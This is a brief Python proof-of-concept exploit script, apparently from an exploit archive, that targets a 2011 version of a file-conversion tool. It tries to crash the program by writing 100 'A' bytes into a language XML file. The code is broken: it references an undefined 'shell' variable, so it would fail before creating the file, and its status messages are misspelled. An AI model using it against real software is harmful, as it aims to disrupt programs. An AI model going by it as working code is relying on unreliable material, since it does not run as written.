# Exploit Title: Hanso Converter v1.1.0 Language File Buffer Overflow - Denial OF Service
# Date: 05.02.2011
# Author: Dame Jovanoski(badc0re)
# Software Link: http://www.hansotools.com/downloads/hanso-converter-setup.exe
# Version: v1.1.0
# Tested on: XP sp3
# Type of exploit:local

from struct import *
import time
f=open("app_fr.xml","w")
print "Creating expoit."
time.sleep(1)
print "Creating explot.."
time.sleep(1)
print "Creating explot..."
junk="\x41"*100
print "Your shellcode size is:",len(shell)
try:    
    f.write(junk)  
    f.close()
    print "File created"
except:
    print "File cannot be created"